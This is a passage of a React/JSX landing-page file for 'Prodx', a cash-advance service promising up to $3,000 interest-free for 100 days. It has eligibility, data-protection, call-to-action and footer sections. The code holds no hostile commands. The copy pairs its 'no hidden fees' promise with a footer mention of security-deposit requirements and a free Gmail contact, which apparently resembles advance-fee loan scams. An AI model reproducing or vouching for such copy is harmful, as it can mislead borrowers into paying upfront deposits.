                <p style={{fontSize:14,color:COLORS.gray500,lineHeight:1.65}}>{b.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── ELIGIBILITY ── */}
      <section style={{padding:"80px 20px",background:"white"}}>
        <div style={{maxWidth:900,margin:"0 auto",display:"grid",gridTemplateColumns:"1fr 1fr",gap:48,alignItems:"center"}}>
          <div>
            <p style={{fontSize:13,fontWeight:700,color:COLORS.orange,letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:12}}>Requirements</p>
            <h2 className="sora" style={{fontSize:"clamp(26px,4vw,38px)",fontWeight:800,color:COLORS.gray900,letterSpacing:"-0.02em",marginBottom:24}}>Do You Qualify?</h2>
            <div style={{display:"flex",flexDirection:"column",gap:14}}>
              {eligibility.map((e,i) => (
                <div key={i} style={{display:"flex",alignItems:"center",gap:12}}>
                  <div style={{width:24,height:24,borderRadius:"50%",background:"#ECFDF5",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}}>
                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 7l3 3 5-5" stroke="#10B981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  </div>
                  <span style={{fontSize:15,color:COLORS.gray700}}>{e}</span>
                </div>
              ))}
            </div>
            <button className="btn-primary" style={{marginTop:32,fontSize:15,padding:"14px 36px"}} onClick={openModal}>Check My Eligibility</button>
          </div>
          <div style={{display:"flex",justifyContent:"center"}}>
            <div style={{background:"linear-gradient(135deg,#FF6B1A,#FF8C42)",borderRadius:28,padding:40,textAlign:"center",boxShadow:"0 20px 60px rgba(255,107,26,0.35)"}}>
              <div style={{fontSize:52,marginBottom:16}}>💼</div>
              <p className="sora" style={{fontSize:40,fontWeight:800,color:"white",lineHeight:1,marginBottom:8}}>$3,000</p>
              <p style={{color:"rgba(255,255,255,0.85)",fontSize:16,marginBottom:4}}>Maximum Advance</p>
              <div style={{background:"rgba(255,255,255,0.2)",borderRadius:50,padding:"6px 16px",display:"inline-block",marginTop:12}}>
                <span style={{color:"white",fontSize:13,fontWeight:700}}>0% Interest · 100 Days</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ── SECURITY SECTION ── */}
      <section style={{padding:"60px 20px",background:"#F0FDF4"}}>
        <div style={{maxWidth:800,margin:"0 auto",textAlign:"center"}}>
          <ShieldIcon/>
          <h3 className="sora" style={{fontSize:"clamp(22px,4vw,32px)",fontWeight:800,color:COLORS.gray900,marginTop:16,marginBottom:14}}>Your Data is Always Protected</h3>
          <p style={{fontSize:15,color:COLORS.gray500,lineHeight:1.7,maxWidth:580,margin:"0 auto 28px"}}>
            Identity, income, and bank verification are handled securely by trusted verification partners. Prodx never directly collects or stores your SSN, card numbers, CVV, account numbers, or routing numbers.
          </p>
          <div style={{display:"flex",flexWrap:"wrap",justifyContent:"center",gap:12}}>
            {["Bank-level encryption","Third-party identity verification","No SSN stored","Secure data partners"].map(t => (
              <span key={t} style={{background:"white",border:"1.5px solid #A7F3D0",borderRadius:50,padding:"8px 18px",fontSize:13,color:"#065F46",fontWeight:600}}>✓ {t}</span>
            ))}
          </div>
        </div>
      </section>

      {/* ── CTA BANNER ── */}
      <section style={{padding:"80px 20px",background:"linear-gradient(135deg,#FF6B1A,#FF8C42)"}}>
        <div style={{maxWidth:700,margin:"0 auto",textAlign:"center"}}>
          <h2 className="sora" style={{fontSize:"clamp(28px,5vw,44px)",fontWeight:800,color:"white",lineHeight:1.2,marginBottom:16,letterSpacing:"-0.02em"}}>
            Ready to Access Your Advance?
          </h2>
          <p style={{color:"rgba(255,255,255,0.88)",fontSize:17,marginBottom:36}}>Apply in minutes. No hidden fees. Transparent terms.</p>
          <button onClick={openModal} style={{background:"white",color:COLORS.orange,border:"none",borderRadius:50,padding:"16px 48px",fontFamily:"'Sora',sans-serif",fontWeight:800,fontSize:17,cursor:"pointer",boxShadow:"0 8px 32px rgba(0,0,0,0.2)",transition:"all 0.25s"}}
            onMouseOver={e=>{e.target.style.transform="translateY(-3px)";e.target.style.boxShadow="0 14px 40px rgba(0,0,0,0.25)"}}
            onMouseOut={e=>{e.target.style.transform="translateY(0)";e.target.style.boxShadow="0 8px 32px rgba(0,0,0,0.2)"}}>
            Apply Now →
          </button>
          <p style={{color:"rgba(255,255,255,0.7)",fontSize:12,marginTop:20}}>
            Not a final approval. Subject to verification and state availability.
          </p>
        </div>
      </section>

      {/* ── FOOTER ── */}
      <footer style={{background:COLORS.gray900,color:"rgba(255,255,255,0.7)",padding:"48px 20px 32px"}}>
        <div style={{maxWidth:1100,margin:"0 auto"}}>
          <div style={{display:"flex",flexWrap:"wrap",justifyContent:"space-between",gap:32,marginBottom:40}}>
            <div>
              <span className="sora" style={{fontSize:24,fontWeight:800,color:"white"}}>Prod<span style={{color:COLORS.orange}}>x</span></span>
              <p style={{fontSize:13,marginTop:10,maxWidth:280,lineHeight:1.7}}>Fast, transparent cash advances for eligible US residents. Up to $3,000 interest-free for 100 days.</p>
            </div>
            <div style={{display:"flex",gap:48,flexWrap:"wrap"}}>
              <div>
                <p className="sora" style={{fontWeight:700,color:"white",fontSize:14,marginBottom:14}}>Legal</p>
                <div style={{display:"flex",flexDirection:"column",gap:10}}>
                  <a href="#" style={{color:"rgba(255,255,255,0.6)",fontSize:14,textDecoration:"none"}}>Privacy Policy</a>
                  <a href="#" style={{color:"rgba(255,255,255,0.6)",fontSize:14,textDecoration:"none"}}>Terms of Service</a>
                  <a href="#" style={{color:"rgba(255,255,255,0.6)",fontSize:14,textDecoration:"none"}}>Eligibility Disclaimer</a>
                </div>
              </div>
              <div>
                <p className="sora" style={{fontWeight:700,color:"white",fontSize:14,marginBottom:14}}>Contact</p>
                <a href="mailto:helloprodx@gmail.com" style={{color:COLORS.orangeLight,fontSize:14,textDecoration:"none"}}>helloprodx@gmail.com</a>
                <a href="tel:+12019726866" style={{color:COLORS.orangeLight,fontSize:14,textDecoration:"none"}}>+1 (201) 972-6866</a>
              </div>
            </div>
          </div>
          <div style={{borderTop:"1px solid rgba(255,255,255,0.1)",paddingTop:24,fontSize:12,color:"rgba(255,255,255,0.4)",lineHeight:1.8}}>
            <p style={{marginBottom:8}}>© 2025 Prodx. All rights reserved.</p>
            <p>
              <strong style={{color:"rgba(255,255,255,0.55)"}}>Disclaimer:</strong> Prodx does not guarantee approval. This is not a final credit decision. Advance availability depends on successful identity, income, and bank verification through our trusted partners, as well as applicable state regulations. Not available in all states. Security deposit requirements and advance amounts subject to eligibility. By applying, you agree to our Terms of Service and Privacy Policy. Identity, income, and bank verification are handled securely by trusted third-party verification providers. Prodx does not collect or store SSNs, card numbers, CVV codes, account numbers, or routing numbers directly.
            </p>
          </div>
        </div>
      </footer>

      {showModal && <ApplyModal onClose={()=>setShowModal(false)}/>}
    </>
  );
}
